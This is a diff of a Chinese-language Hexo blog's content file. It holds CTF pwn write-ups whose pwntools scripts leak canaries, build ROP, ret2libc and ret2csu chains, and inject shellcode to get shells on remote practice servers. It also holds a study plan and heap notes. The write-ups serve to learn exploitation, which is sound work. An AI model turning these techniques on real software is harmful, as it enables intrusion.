+<p>#params<br>rdi_addr &#x3D; 0x400733<br>rsi_r15_addr &#x3D; 0x400731<br>main_addr &#x3D; elf.symbols[‘main’]<br>printf_plt&#x3D;elf.plt[‘printf’]<br>read_got&#x3D;elf.got[‘read’]<br>format_str &#x3D; 0x400770</p>
+<p>#attack<br>payload&#x3D;b’M’*(0x20+8) + p64(rdi_addr) + p64(format_str) + p64(rsi_r15_addr) + p64(read_got) + p64(0) + p64(printf_plt) + p64(main_addr)<br>r.recv()<br>r.sendline(payload)<br>read_addr &#x3D; u64(r.recvuntil(b’\x7f’)[-6:].ljust(8,b’\x00’))<br>print(“read_addr: “ + hex(read_addr))</p>
+<p>#libc<br>base_addr &#x3D; read_addr - libc.symbols[‘read’]<br>system_addr &#x3D; base_addr + libc.symbols[‘system’]<br>bin_sh_addr &#x3D; base_addr + next(libc.search(b’&#x2F;bin&#x2F;sh’))<br>print(“system_addr: “ + (hex(system_addr)))<br>print(“bin_sh_addr: “ + (hex(bin_sh_addr)))</p>
+<p>#attack2<br>payload&#x3D;b’M’*(0x20+8) + p64(rdi_addr) + p64(bin_sh_addr) + p64(system_addr)<br>r.recv()<br>r.sendline(payload)</p>
+<p>r.interactive()</p>
+<h2 id="2021-鹤城杯-littleof"><a href="#2021-鹤城杯-littleof" class="headerlink" title="[2021 鹤城杯]littleof"></a>[2021 鹤城杯]littleof</h2><p><strong>checksec一下</strong></p>
+<p><img src="/2023/03/07/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-03-14%20200914.png"></p>
+<p>发现有canary保护</p>
+<p><strong>ida查看</strong></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_4006E2</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-50h] BYREF</span></span><br><span class="line">  FILE *v2; <span class="comment">// [rsp+18h] [rbp-48h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v2 = <span class="built_in">stdin</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you know how to do buffer overflow?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s. Try harder!&quot;</span>, buf);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I hope you win&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>很显然栈溢出漏洞位于read函数中，buf大小为0x50，而read函数的第三参数，也就是<strong>输出&#x2F;写入&#x2F;输出</strong>的最大的字节长度为0x100，就是2个buf大小的数据。但是本题开启了Canary，因此我们不能直接进行栈溢出以及Ret2Libc攻击。我们可以发现，我们输入的Payload会被第二段的printf打印出来。也就是说可以利用这个printf打印出来Canary，将Canary原封不动的归位，即可跳过检测。</p>
+<p><strong>canary</strong></p>
+<p>Canary是位于EBP之前的一串随机数据，用来防止栈上的内容溢出进行某些危险攻击的。我们都知道Canary 会在栈上添加一个随机值，以保护程序免受缓冲区溢出攻击，但是也会在栈上多占用一些空间。</p>
+<p>也就是说：</p>
+<p><strong>假如我的 buf 大小为 0x50</strong></p>
+<p><strong>如果是 64 位程序，那么 Canary 就会在栈上额外占用 0x08 的空间作为随机值。</strong></p>
+<p><strong>也就是说 我的可用空间只有 0x42 。</strong></p>
+<p><strong>开启 Canary ： RBP 位于 0x50 + 0x08，Canary位于0x50 - 0x08，Return Address位于0x50 + 0x16</strong></p>
+<p><strong>而 0x50 + 0x08 在不开启 Canary 的情况下是 Return Address 的地址</strong></p>
+<p><strong>关闭 Canary ： RBP 位于 0x50，Return Address位于0x50 + 0x08</strong></p>
+<p><strong>这时候的 0x50 + 0x08 是 Return Address 的地址。</strong></p>
+<p>具体思路如下：</p>
+<p><strong>因为Canary是栈中的一个随机值，我们通过printf泄露Canary，然后将其填充至它本来应该在的位置，就能通过检查。</strong></p>
+<p><strong>exp</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="comment">#io = process(&quot;littleof&quot;)</span></span><br><span class="line">io = remote()</span><br><span class="line">elf = ELF(<span class="string">&quot;littleof&quot;</span>)</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>,arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">rdi = <span class="number">0x400863</span></span><br><span class="line">ret = <span class="number">0x40059E</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = <span class="number">0x400789</span></span><br><span class="line"> </span><br><span class="line">Padding = <span class="string">b&#x27;A&#x27;</span> * ( <span class="number">0x50</span> - <span class="number">0x08</span> )</span><br><span class="line">Padding_Ret = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x08</span></span><br><span class="line"> </span><br><span class="line">io.recvuntil(<span class="string">b&#x27;overflow?&#x27;</span>)</span><br><span class="line">Payload_Canary = Padding</span><br><span class="line">io.sendline(Payload_Canary)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n&#x27;</span>)</span><br><span class="line">Canary = u64(io.recv(<span class="number">7</span>).rjust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;Canary: &quot;</span> + (<span class="built_in">hex</span>(Canary)))</span><br><span class="line"> 发送了<span class="number">0x49</span>个字节，总共<span class="number">0x50</span>个字节，程序会把Canary放在变量起始位置，所以只需要接收<span class="number">7</span>个，然后用一个<span class="number">0</span>填充即可。</span><br><span class="line"> Payload_Leak = Padding + p64(Canary) + Padding_Ret + p64(rdi) + p64(puts_got) + p64(puts_plt) + p64(main)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Try harder!&#x27;</span>,Payload_Leak)</span><br><span class="line">addr = u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;Real Address: &quot;</span> + (<span class="built_in">hex</span>(addr)))</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Local</span></span><br><span class="line"><span class="comment">#ibc = LibcSearcher(&#x27;puts&#x27;,addr)</span></span><br><span class="line"><span class="comment">#base = addr - libc.dump(&#x27;puts&#x27;)</span></span><br><span class="line"><span class="comment">#system = base + libc.dump(&#x27;system&#x27;)</span></span><br><span class="line"><span class="comment">#binsh = base + libc.dump(&#x27;str_bin_sh&#x27;)</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># Remote</span></span><br><span class="line">base = addr - <span class="number">0x080aa0</span></span><br><span class="line">system = base + <span class="number">0x04f550</span></span><br><span class="line">binsh = base + <span class="number">0x1b3e1a</span></span><br><span class="line"> </span><br><span class="line">io.recvuntil(<span class="string">b&#x27;overflow?&#x27;</span>)</span><br><span class="line">Payload_Canary = Padding</span><br><span class="line">io.sendline(Payload_Canary)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n&#x27;</span>)</span><br><span class="line">Canary = u64(io.recv(<span class="number">7</span>).rjust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;Canary: &quot;</span> + (<span class="built_in">hex</span>(Canary)))</span><br><span class="line"> </span><br><span class="line">Payload_Shell = Padding + p64(Canary) + Padding_Ret + p64(ret) + p64(rdi) + p64(binsh) + p64(system)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Try harder!&#x27;</span>,Payload_Shell)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>Padding就是上文泄露Canary的Payload</p>
+<p>Canary就是Canary的数据</p>
+<p>Padding_Ret 代表覆盖原先栈上的 RBP</p>
+<p>Ret 用来平衡栈帧</p>
+<p>Rdi 用来存放 system 的第一个函数，也就是 &#x2F;bin&#x2F;sh 字符串的地址的。</p>
+<h2 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a>ciscn_2019_s_3</h2><p>from pwn import *<br>p &#x3D;remote(‘node4.buuoj.cn’,27440)<br>elf &#x3D; ELF(‘.&#x2F;ciscn_s_3’)<br>context.log_level &#x3D; ‘debug’<br>main_addr &#x3D; elf.symbols[‘main’]<br>csu_end &#x3D; 0x040059A<br>csu_front &#x3D; 0x0400580<br>ret_addr &#x3D; 0x004003a9<br>rax_59_ret &#x3D; 0x04004E2<br>syscall &#x3D; 0x0400517<br>payload &#x3D; b’&#x2F;bin&#x2F;sh\x00’ + b’A’*0x8 + p64(main_addr)<br>p.sendline(payload)<br>p.recv(0x20)<br>stack_addr &#x3D; u64(p.recv(8))<br>print(‘stack_addr–&gt;’ + hex(stack_addr))<br>binsh_addr &#x3D; stack_addr - 0x138<br>rax_59 &#x3D; binsh_addr + 0x10<br>pop_rdi &#x3D; 0x04005a3<br>payload &#x3D; b’&#x2F;bin&#x2F;sh\x00’ + b’A’*0x8 + p64(rax_59_ret) + p64(csu_end)<br>payload +&#x3D; p64(0) + p64(1) + p64(rax_59) + p64(0) + p64(0) + p64(0)<br>payload +&#x3D; p64(csu_front)<br>payload +&#x3D; b’a’*0x38<br>payload +&#x3D; p64(pop_rdi)<br>payload +&#x3D; p64(binsh_addr)<br>payload +&#x3D; p64(syscall)<br>p.sendline(payload)<br>p.interactive()</p>
+<p>‘’’<br>调用execve需要</p>
+<p>$rax&#x3D;&#x3D;59</p>
+<p>$rdi&#x3D;&#x3D;“&#x2F;bin&#x2F;sh”</p>
+<p>$rsi&#x3D;&#x3D;0</p>
+<p>$rdx&#x3D;&#x3D;0</p>
+<p>syscall</p>
+<p>def ret_csu(r12, r13, r14, r15, last):<br>    payload &#x3D; offset * ‘a’<br>    #构造栈溢出的padding<br>    payload +&#x3D; p64(first_csu) + ‘a’ * 8<br>    #gadgets1的地址<br>    payload +&#x3D; p64(0) + p64(1)<br>    #rbx&#x3D;0, rbp&#x3D;1<br>    payload +&#x3D; p64(r12)<br>    #call调用的地址<br>    payload +&#x3D; p64(r13) + p64(r14) + p64(r15)<br>    #三个参数的寄存器<br>    payload +&#x3D; p64(second_csu)<br>    #gadgets2的地址<br>    payload +&#x3D; ‘a’ * 56<br>    #pop出的padding<br>    payload +&#x3D; p64(last)<br>    #函数最后的返回地址<br>    return payload</p>
+<h2 id="ez-pz-hackover-2016"><a href="#ez-pz-hackover-2016" class="headerlink" title="ez_pz_hackover_2016"></a>ez_pz_hackover_2016</h2><p>‘’’<br>调试脚本</p>
+<p>from pwn import *<br>context(log_level &#x3D; ‘debug’,os&#x3D;’linux’,arch&#x3D;’i386’)<br>p &#x3D; process(‘.&#x2F;ez’)<br>gdb.attach(p)<br>p.recvuntil(‘crash: ‘)<br>stack_addr &#x3D; int(p.recv(10), 16)<br>payload &#x3D; b’crashme\x00’ + b’a’*18<br>payload +&#x3D; p32(0) + asm(shellcraft.sh())<br>p.recvuntil(‘&gt; ‘)<br>p.sendline(payload)<br>pause()<br>p.interactive()<br>‘’’<br>#coding&#x3D;utf-8<br>from pwn import *<br>context.log_level &#x3D; ‘debug’<br>p&#x3D;remote(‘node4.buuoj.cn’,25049)<br>shellcode &#x3D; asm(shellcraft.sh())<br>p.recvuntil(‘lets crash: ‘)<br>stack_addr &#x3D; int(p.recv(10),16)<br>shellcode_addr &#x3D; stack_addr-28<br>payload &#x3D; b’crashme\x00’.ljust(26,b”\x00”)<br>payload +&#x3D; p32(shellcode_addr)+shellcode<br>p.recvuntil(‘&gt;’)<br>p.sendline(payload)<br>p.interactive()</p>
+<h2 id="picoctf-2018-rop-chain"><a href="#picoctf-2018-rop-chain" class="headerlink" title="picoctf_2018_rop chain"></a>picoctf_2018_rop chain</h2><p>from pwn import *<br>context(os&#x3D;’linux’,arch&#x3D;’i386’,log_level&#x3D;’debug’)<br>p&#x3D;remote(‘node4.buuoj.cn’,27550)<br>elf&#x3D;ELF(‘.&#x2F;rop_chain’)<br>flag_addr&#x3D;elf.symbols[‘flag’]<br>win1_addr&#x3D;elf.symbols[‘win_function1’]<br>win2_addr&#x3D;elf.symbols[‘win_function2’]<br>win2_a1&#x3D;0xBAAAAAAD#-1163220307十六进制补码<br>flag_a1&#x3D;0xDEADBAAD#-559039827十六进制补码<br>payload&#x3D;b’a’*(0x18+4)+p32(win1_addr)+p32(win2_addr)+p32(flag_addr)+p32(win2_a1)+p32(flag_a1)<br>p.sendline(payload)<br>p.interactive()</p>
+]]></content>
+      <categories>
+        <category>pwn</category>
+      </categories>
+      <tags>
+        <tag>刷题</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hello World</title>
+    <url>/2023/02/18/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+]]></content>
+  </entry>
+  <entry>
     <title>pwn堆题刷题记录</title>
     <url>/2023/04/10/pwn%E5%A0%86%E9%A2%98%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
     <content><![CDATA[<h1 id="堆问题"><a href="#堆问题" class="headerlink" title="堆问题"></a>堆问题</h1><h2 id="0ctf-2017-babyheap"><a href="#0ctf-2017-babyheap" class="headerlink" title="0ctf_2017_babyheap"></a>0ctf_2017_babyheap</h2><p>前言：buu刷题遇到到第一道堆题，是我刷题到目前为止遇到到最大的挑战，我也是看了很多wp才逐渐理解这道题的思路，希望可以慢慢前进吧</p>
@@ -575,27 +593,117 @@
       </tags>
   </entry>
   <entry>
-    <title>Hello World</title>
-    <url>/2023/02/18/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-]]></content>
-  </entry>
-  <entry>
     <title>内核学习</title>
     <url>/2023/03/14/%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0/</url>
     <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>周计划</title>
+    <url>/2023/03/04/%E5%91%A8%E8%AE%A1%E5%88%92-1/</url>
+    <content><![CDATA[<h1 id="大一下学期目标"><a href="#大一下学期目标" class="headerlink" title="大一下学期目标"></a>大一下学期目标</h1><p><strong>主线</strong>：<strong>学习pwn的栈 堆和内核，学习计算机系统基础</strong></p>
+<p><strong>主线</strong>：<strong>完成现代c++的学习</strong></p>
+<p><strong>《深入了解操作系统》的阅读以及lab的练习</strong></p>
+<p><strong>完成<em>MIT.6S081</em>课程学习和lab的练习</strong></p>
+<h2 id="第4周"><a href="#第4周" class="headerlink" title="第4周"></a>第4周</h2><p>总目标：</p>
+<p><strong>现代c++：</strong>part1，part2 </p>
+<p><strong>pwn：</strong>理解堆</p>
+<p><strong>xv6：</strong>lab1完成</p>
+<p><strong>re:</strong> 简单了解逆向</p>
+<h3 id="周一"><a href="#周一" class="headerlink" title="周一"></a>周一</h3><p>现代c++：程序的执行过程，new关键字及内存内存，命名空间，c++的标准输入输出简历</p>
+<p>pwn：堆理解</p>
+<p>逆向刷题</p>
+<p>pwn刷题</p>
+<h3 id="周二"><a href="#周二" class="headerlink" title="周二"></a>周二</h3><p>现代c++：const关键字介绍 ，auto关键字使用</p>
+<p>pwn ：刷题整理</p>
+<h3 id="周三"><a href="#周三" class="headerlink" title="周三"></a>周三</h3><p>划水</p>
+<h3 id="周四"><a href="#周四" class="headerlink" title="周四"></a>周四</h3><p>现代c++：静态变量，指针和引用 ，左值，右值，左值引用，右值引用，move函数，临时对象 ，可调用对象</p>
+<p>pwn:pwn栈题总结</p>
+<h3 id="周五"><a href="#周五" class="headerlink" title="周五"></a>周五</h3><p>划水</p>
+<h3 id="周六"><a href="#周六" class="headerlink" title="周六"></a>周六</h3><p>xv6操作系统lab1完成</p>
+<h3 id="周日"><a href="#周日" class="headerlink" title="周日"></a>周日</h3><p>划水</p>
+<h2 id="第五周"><a href="#第五周" class="headerlink" title="第五周"></a>第五周</h2><p>总目标：</p>
+<p>现代c++：part3，part4</p>
+<p>堆：深入理解并开始刷题，栈题整理</p>
+<p>csapp：第一章第二章</p>
+<h3 id="周一-1"><a href="#周一-1" class="headerlink" title="周一"></a>周一</h3><p>现代c++：类介绍，构造函数，析构函数，this，长成员函数于常对象，inline，mutable，default，delete</p>
+<p>pwn:栈题整理</p>
+<h3 id="周二-1"><a href="#周二-1" class="headerlink" title="周二"></a>周二</h3><p>现代c++：友元类和友元函数， 重载运算符，普通继承及其实现原理</p>
+<p>pwn:栈题整理，堆理解</p>
+<h3 id="周三-1"><a href="#周三-1" class="headerlink" title="周三"></a>周三</h3><p>理解堆</p>
+<h3 id="周四-1"><a href="#周四-1" class="headerlink" title="周四"></a>周四</h3><p>现代c++：虚函数及其实现原理 override关键字 ，静态成员变量与静态函数 ， 纯虚函数 ，RTTL</p>
+<h3 id="周五-1"><a href="#周五-1" class="headerlink" title="周五"></a>周五</h3><p>现代c++：多继承 ， 虚继承及其实现原理 ，智能指针概述</p>
+<h3 id="周六-1"><a href="#周六-1" class="headerlink" title="周六"></a>周六</h3><p>pwn：堆：main_arena和top chunk ， free函数和bins</p>
+<h3 id="周日-1"><a href="#周日-1" class="headerlink" title="周日"></a>周日</h3><p>划水</p>
+<h2 id="第六周"><a href="#第六周" class="headerlink" title="第六周"></a>第六周</h2><p>总目标：</p>
+<p>现代c++：智能指针，模板与泛型编程，复习</p>
+<p>pwn：堆题入门，gdb pwntools使用，栈刷题</p>
+<p>《程序员的自我修养》阅读</p>
+<h3 id="周一-2"><a href="#周一-2" class="headerlink" title="周一"></a>周一</h3><p>现代c++：shard_ptr ， weak_ptr</p>
+<p>pwn：堆深入理解并尝试例题</p>
+<h3 id="周二-2"><a href="#周二-2" class="headerlink" title="周二"></a>周二</h3><p>现代c++:uniqe_ptr,指针使用范围</p>
+<p>pwn:栈复习，堆理解</p>
+<h3 id="周三-2"><a href="#周三-2" class="headerlink" title="周三"></a>周三</h3><p>现代c++模板介绍，类模板与模板实现原理</p>
+<h3 id="周四-2"><a href="#周四-2" class="headerlink" title="周四"></a>周四</h3><p>周四发现甲流了(其实周三就有点感觉了)，一直到周日没翻开过电脑</p>
+<p>![](<a href="https://cdn.jsdelivr.net/gh/jangfan/picb@main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE">https://cdn.jsdelivr.net/gh/jangfan/picb@main/屏幕截图</a> 2023-03-27 171751.png)</p>
+<h2 id="第七周"><a href="#第七周" class="headerlink" title="第七周"></a>第七周</h2><p>总目标：</p>
+<p>8086汇编</p>
+<p>现代c++:模板与泛型编程</p>
+<h3 id="周一-3"><a href="#周一-3" class="headerlink" title="周一"></a>周一</h3><p>现代c++:模板与泛型编程，类模板与模板实现原理，intitializer_list与typename</p>
+<h3 id="周二-3"><a href="#周二-3" class="headerlink" title="周二"></a>周二</h3><p>现代c++:函数模板，成员函数模板</p>
+<p>8086汇编：一到四章</p>
+<h3 id="周三-3"><a href="#周三-3" class="headerlink" title="周三"></a>周三</h3><p>现代c++:默认模板参数， 模板的重载，全特化和偏特化</p>
+<p>8086汇编：五到八章</p>
+<h3 id="周四到周日"><a href="#周四到周日" class="headerlink" title="周四到周日"></a>周四到周日</h3><p>hhh，去徐州旅游了，体验了大学生的生活，寻找了自我</p>
+<h2 id="第八周"><a href="#第八周" class="headerlink" title="第八周"></a>第八周</h2><p>总目标:</p>
+<p>上周深得大佬指点，这种重新规划了一下学习路线</p>
+<p>1：从本周开始：现代c++的学习先暂停，开启慕课计算机基础的学习</p>
+<p>2.继续坚持ctfpwn方向的刷题和学习</p>
+<p>3.开始学习其他的方向：re，web，密码</p>
+<h3 id="周一-4"><a href="#周一-4" class="headerlink" title="周一"></a>周一</h3><p>计算机系统基础：第一周：计算机系统概述</p>
+<h3 id="周二周三"><a href="#周二周三" class="headerlink" title="周二周三"></a>周二周三</h3><p>摆烂了</p>
+<h3 id="周四-3"><a href="#周四-3" class="headerlink" title="周四"></a>周四</h3><p>继续摆烂，练几道re</p>
+<h3 id="周五周六"><a href="#周五周六" class="headerlink" title="周五周六"></a>周五周六</h3><p>摆烂的情况下慢慢推进pwn的堆学习</p>
+<h3 id="周日-2"><a href="#周日-2" class="headerlink" title="周日"></a>周日</h3><p>继续学习pwn的堆(以后一定要用更多时间学习，真的难了)</p>
+<h2 id="第九周"><a href="#第九周" class="headerlink" title="第九周"></a>第九周</h2><p>总目标：</p>
+<p>计算机基础慢慢听</p>
+<p>加速推进pwn的学习</p>
+<h3 id="周一-5"><a href="#周一-5" class="headerlink" title="周一"></a>周一</h3><p>解决一道堆题</p>
+<p>练习re</p>
+<p>整理编码</p>
+<h3 id="周二-4"><a href="#周二-4" class="headerlink" title="周二"></a>周二</h3><p>计算机系统基础：数据的表示和存储</p>
+<h3 id="周三-4"><a href="#周三-4" class="headerlink" title="周三"></a>周三</h3><p>pwn工具使用</p>
+<h3 id="周四-4"><a href="#周四-4" class="headerlink" title="周四"></a>周四</h3><p>练题</p>
+<h3 id="周五-2"><a href="#周五-2" class="headerlink" title="周五"></a>周五</h3><p>将栈迁移弄明白，解决iscc一道pwn题，准备周六的比赛</p>
+<h3 id="周六-2"><a href="#周六-2" class="headerlink" title="周六"></a>周六</h3><p>比赛</p>
+<h2 id="第十周"><a href="#第十周" class="headerlink" title="第十周"></a>第十周</h2><p>总目标：tmux pwncli 堆入门</p>
+<h3 id="周一-6"><a href="#周一-6" class="headerlink" title="周一"></a>周一</h3><p>简单了解makefile</p>
+<h3 id="周二-5"><a href="#周二-5" class="headerlink" title="周二"></a>周二</h3><p>配置wsl环境失败</p>
+<h3 id="周三-5"><a href="#周三-5" class="headerlink" title="周三"></a>周三</h3><p>写组会文档</p>
+<p>tmux pwncli</p>
+<p>深入了解堆 写题</p>
+<h3 id="周四-5"><a href="#周四-5" class="headerlink" title="周四"></a>周四</h3><p>安装wsl环境</p>
+<p>复习堆知识</p>
+<p>阅读pwndbg文档，pwncli文档，组会工具知识点总结</p>
+<h3 id="周五-3"><a href="#周五-3" class="headerlink" title="周五"></a>周五</h3><p>安装wsl环境</p>
+<p>堆理解听课</p>
+<p>栈复习以及深度学习</p>
+<p>阅读文档how2heap</p>
+<h2 id="第十一周"><a href="#第十一周" class="headerlink" title="第十一周"></a>第十一周</h2><p>总目标（以后一天一道堆题和一到栈题）</p>
+<p>栈复习以及深度学习</p>
+<p>完成堆概念听课</p>
+<p>完成c++的万年历项目</p>
+<p>how2heap学习</p>
+<p>how利用方式学习</p>
+<h3 id="周一-7"><a href="#周一-7" class="headerlink" title="周一"></a>周一</h3><p>概念课听完</p>
+<p>确定万年历的思路</p>
+<p>刷堆题</p>
+]]></content>
+      <categories>
+        <category>计划</category>
+      </categories>
+      <tags>
+        <tag>生活</tag>
+      </tags>
   </entry>
   <entry>
     <title>堆学习(一)</title>
@@ -615,10 +723,10 @@
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line">    INTERNAL_SIZE_T prev_size; <span class="comment">/* Size of previous chunk (if free). */</span></span><br><span class="line">    INTERNAL_SIZE_T size; <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* Only used for large blocks: pointer to next larger size. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>每个程序分配的内存(这里指的是malloc函数)，在内部被一个叫”堆块”的所替代。一个堆块是由程序返回内存组成的(实际上是malloc的返回值)。这块区域在申请新的内存的时候会不断扩大。同样，当一定数量的内存释放时，堆也可以收缩。</p>
-<p><strong>1.pre_size 字段:</strong> 只有在前面一个堆块是空闲的时候才有值，用来指示前一个堆块的大小。前面一个堆块在使用时，他的值始终为 0<br><strong>2.size 字段:</strong> 是用来指示当前堆块的大小的（头部加上 user data 的大小）。但是这个字段的最后三位相当于三个 flag ，有另外的作用。</p>
+<p><strong>1.pre_size 字段:</strong> 只有在前面一个堆块是空闲的时候才有值，用来指示前一个堆块的大小。前面一个堆块在使用时，他的值始终为 0<br><strong>2.size 字段:</strong> 是用来指示当前堆块的大小的（头部包括pre_size加上 user data 的大小）。但是这个字段的最后三位相当于三个 flag ，有另外的作用。</p>
 <p>​      <code>NON_MAIN_ARENA</code>，记录当前 chunk 是否不属于主线程，1 表示不属于，0 表示属于。</p>
 <p>​      <code>IS_MAPPED</code>，记录当前 chunk 是否是由 mmap 分配的。</p>
-<p>​      <code> PREV_INUSE</code>，记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 P 位都会被设置为 1，以便于防止访问前             面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。</p>
